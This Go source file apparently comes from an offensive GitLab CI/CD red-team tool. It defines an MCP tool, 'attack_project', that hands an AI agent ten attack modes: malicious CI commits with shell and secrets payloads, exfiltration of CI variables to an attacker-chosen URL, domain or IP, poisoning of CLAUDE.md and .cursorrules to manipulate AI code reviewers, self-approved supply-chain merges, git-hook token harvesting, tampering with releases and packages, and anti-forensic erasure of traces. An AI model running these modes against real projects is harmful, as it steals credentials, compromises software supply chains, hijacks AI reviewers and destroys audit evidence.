package mcpserver

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/mr-pmillz/gogatoz/pkg/attack"
)

const (
	statusError    = "error"
	payloadSecrets = "secrets"
)

// attackTool is the MCP tool definition for executing attack workflows.
var attackTool = &mcp.Tool{
	Name: "attack_project",
	Description: `Execute attack workflows against a GitLab project. Ten modes available:

  - commit_ci: Commit a malicious .gitlab-ci.yml with a chosen payload (ror-shell, pwn-request, ror, secrets, git-hook, cache-poison) or raw YAML.
  - secrets: Run a secrets exfiltration pipeline that dumps CI variables and environment.
  - discover_tags: Discover runner tags available to the project for targeting.
  - ai_inject: Commit a poisoned AI config file (CLAUDE.md, .cursorrules, etc.) to exploit AI code reviewers.
  - auto_merge: Create MR, self-approve, and merge to default branch (supply chain attack).
  - inject_script: Modify repo scripts called by CI for stealthy code execution (workflow hopping).
  - harvest: Install git hooks on runner and wait for callbacks to harvest tokens.
  - tamper_release: Modify GitLab release metadata and replace/add asset links.
  - tamper_package: Upload a malicious package to the Generic Packages registry.
  - cleanup_traces: Erase job traces and/or delete pipelines (anti-forensics).

Typical workflow: search_projects → enumerate_projects → attack_project.`,
}

// --- Input / Output types ------------------------------------------------

type attackInput struct {
	Target           string `json:"target"             jsonschema:"Project ID or path-with-namespace,required"`
	Mode             string `json:"mode"               jsonschema:"Attack mode: commit_ci, secrets, discover_tags, or ai_inject,required"`
	Payload          string `json:"payload"             jsonschema:"Payload type for commit_ci: ror-shell, pwn-request, ror, secrets"`
	Branch           string `json:"branch"              jsonschema:"Branch name (default: gogatoz-attack)"`
	Deconflict       string `json:"deconflict"          jsonschema:"Branch deconflict strategy: fail, suffix, force (default: suffix)"`
	Tags             string `json:"tags"                jsonschema:"Comma-separated runner tags"`
	Command          string `json:"command"             jsonschema:"Command for ror-shell payload (default: id; uname -a)"`
	CIYAML           string `json:"ci_yaml"             jsonschema:"Raw CI YAML (alternative to payload)"`
	CommitMessage    string `json:"commit_message"      jsonschema:"Custom commit message"`
	ScriptURL        string `json:"script_url"          jsonschema:"Script URL for runner-on-runner payload"`
	TargetOS         string `json:"target_os"           jsonschema:"Target OS for ror: linux, windows, macos"`
	TargetBranchExpr string `json:"target_branch_expr"  jsonschema:"Regex for pwn-request target branch filter"`
	ExfilMethod      string `json:"exfil_method"        jsonschema:"Exfil method: artifact, http, dns, icmp, git, cloud"`
	ExfilTarget      string `json:"exfil_target"        jsonschema:"URL/domain/IP for exfil transport"`
	Executor         string `json:"executor"            jsonschema:"Filter discovered tags by executor: docker, shell, kubernetes"`
	WaitForPipeline  *bool  `json:"wait_for_pipeline"   jsonschema:"Wait for pipeline creation (default: true)"`
	PipelineTimeout  string `json:"pipeline_timeout"    jsonschema:"Timeout for pipeline wait (default: 30s)"`
	AIConfigFile     string `json:"ai_config_file"      jsonschema:"AI config file to poison for ai_inject mode (default: CLAUDE.md)"`
	AIPrompt         string `json:"ai_prompt"            jsonschema:"Custom poison prompt content for ai_inject mode (uses default if empty)"`
	CreateMR         bool   `json:"create_mr"            jsonschema:"Create a merge request after committing (ai_inject and commit_ci modes)"`
	MRTitle          string `json:"mr_title"              jsonschema:"Merge request title"`
	MRDescription    string `json:"mr_description"        jsonschema:"Merge request description"`
	MRTargetBranch   string `json:"mr_target_branch"      jsonschema:"Target branch for the merge request"`
	// Auto-merge mode
	AutoMergeFile string `json:"auto_merge_file"      jsonschema:"File path to modify in auto_merge mode (default: .gitlab-ci.yml)"`
	// Script injection mode
	ScriptPath    string `json:"script_path"          jsonschema:"Path to script to inject into (auto-detected if empty)"`
	ScriptPayload string `json:"script_payload"       jsonschema:"Shell payload to inject into the target script"`
	ScriptPrepend bool   `json:"script_prepend"       jsonschema:"Prepend payload to script (default: true)"`
	// Harvest mode
	Webhook        string `json:"webhook"              jsonschema:"Callback URL for harvest mode (external URL reachable from runners)"`
	ListenAddr     string `json:"listen_addr"          jsonschema:"Listen address for harvest callback server (default :9443)"`
	HarvestTimeout string `json:"harvest_timeout"      jsonschema:"Harvest timeout duration (default 30m)"`
	HookType       string `json:"hook_type"            jsonschema:"Git hook type: post-checkout, post-merge, pre-push (default: post-checkout)"`
	// Cache poison payload
	CacheKey  string `json:"cache_key"            jsonschema:"Cache key to target for cache-poison payload"`
	CachePath string `json:"cache_path"           jsonschema:"Cache path to poison for cache-poison payload"`
	PoisonCmd string `json:"poison_cmd"           jsonschema:"Command to run for cache poisoning"`
	// Tamper release mode
	TagName     string `json:"tag_name"             jsonschema:"Release tag name for tamper_release"`
	ReleaseName string `json:"release_name"         jsonschema:"New release name for tamper_release"`
	ReleaseDesc string `json:"release_desc"         jsonschema:"New release description for tamper_release"`
	LinkName    string `json:"link_name"            jsonschema:"Release link name to replace"`
	LinkURL     string `json:"link_url"             jsonschema:"New URL for replaced release link"`
	AddLinkName string `json:"add_link_name"        jsonschema:"Name of new release link to add"`
	AddLinkURL  string `json:"add_link_url"         jsonschema:"URL of new release link to add"`
	// Tamper package mode
	PackageName    string `json:"package_name"        jsonschema:"Package name for tamper_package"`
	PackageVersion string `json:"package_version"     jsonschema:"Package version for tamper_package"`
	PackageFile    string `json:"package_file"        jsonschema:"Local file path for tamper_package"`
	// Cleanup traces mode
	PipelineIDStr  string `json:"pipeline_id"         jsonschema:"Pipeline ID to delete for cleanup_traces"`
	CleanupJobs    bool   `json:"cleanup_jobs"        jsonschema:"Erase all job traces for cleanup_traces mode"`
	CleanupJobsRef string `json:"cleanup_jobs_ref"    jsonschema:"Limit job trace erasure to pipelines on this ref"`
	CleanupJobsMax int    `json:"cleanup_jobs_max"    jsonschema:"Max recent pipelines to erase job traces from (default: 5)"`
}

type runnerOut struct {
	ID          int64    `json:"id"`
	Description string   `json:"description"`
	IsShared    bool     `json:"is_shared"`
	RunnerType  string   `json:"runner_type"`
	Tags        []string `json:"tags"`
}

type attackOutput struct {
	Mode            string      `json:"mode"`
	Target          string      `json:"target"`
	Status          string      `json:"status"` // success | error
	Error           string      `json:"error,omitempty"`
	PipelineURL     string      `json:"pipeline_url,omitempty"`
	PipelineID      int64       `json:"pipeline_id,omitempty"`
	Branch          string      `json:"branch,omitempty"`
	Payload         string      `json:"payload,omitempty"`
	Tags            []string    `json:"tags,omitempty"`
	Runners         []runnerOut `json:"runners,omitempty"`
	ConfigFile      string      `json:"config_file,omitempty"`
	MergeRequestURL string      `json:"merge_request_url,omitempty"`
	MergeRequestIID int64       `json:"merge_request_iid,omitempty"`
	Approved        bool        `json:"approved,omitempty"`
	Merged          bool        `json:"merged,omitempty"`
	Credentials     int         `json:"credentials_harvested,omitempty"`
	Callbacks       int         `json:"callbacks_received,omitempty"`
	PackageURL      string      `json:"package_url,omitempty"`
	LinksReplaced   int         `json:"links_replaced,omitempty"`
	LinksAdded      int         `json:"links_added,omitempty"`
	JobsErased      int         `json:"jobs_erased,omitempty"`
	ScriptPath      string      `json:"script_path,omitempty"`
	DurationMS      int64       `json:"duration_ms"`
}

// --- Handler -------------------------------------------------------------

func (s *Server) handleAttackProject(
	ctx context.Context,
	_ *mcp.CallToolRequest,
	input attackInput,
) (*mcp.CallToolResult, attackOutput, error) {
	target := strings.TrimSpace(input.Target)
	mode := strings.ToLower(strings.TrimSpace(input.Mode))
	if target == "" {
		return nil, attackOutput{}, fmt.Errorf("target is required")
	}
	if mode == "" {
		return nil, attackOutput{}, fmt.Errorf("mode is required (commit_ci, secrets, discover_tags, ai_inject, auto_merge, inject_script, harvest, tamper_release, tamper_package, cleanup_traces)")
	}

	start := time.Now()
	att := attack.NewAttacker(s.client, s.gitlabURL, "", "", 30*time.Second)
	if _, err := att.SetupUser(ctx); err != nil {
		return nil, attackOutput{}, fmt.Errorf("setup user: %w", err)
	}

	var out attackOutput
	out.Mode = mode
	out.Target = target
	out.Status = "success"

	switch mode {
	case "discover_tags":
		out = s.handleDiscoverTags(ctx, input, out)
	case "commit_ci":
		out = s.handleCommitCI(ctx, att, input, out)
	case payloadSecrets:
		out = s.handleSecrets(ctx, att, input, out)
	case "ai_inject":
		out = s.handleAIInject(ctx, att, input, out)
	case "auto_merge":
		out = s.handleAutoMerge(ctx, att, input, out)
	case "inject_script":
		out = s.handleInjectScript(ctx, att, input, out)
	case "harvest":
		out = s.handleHarvest(ctx, att, input, out)
	case "tamper_release":
		out = s.handleTamperRelease(ctx, input, out)
	case "tamper_package":
		out = s.handleTamperPackage(ctx, input, out)
	case "cleanup_traces":
		out = s.handleCleanupTraces(ctx, att, input, out)
	default:
		return nil, attackOutput{}, fmt.Errorf("unknown mode %q: use commit_ci, secrets, discover_tags, ai_inject, auto_merge, inject_script, harvest, tamper_release, tamper_package, or cleanup_traces", mode)
	}

	out.DurationMS = time.Since(start).Milliseconds()
	s.persistAttack(out)
	return nil, out, nil
}
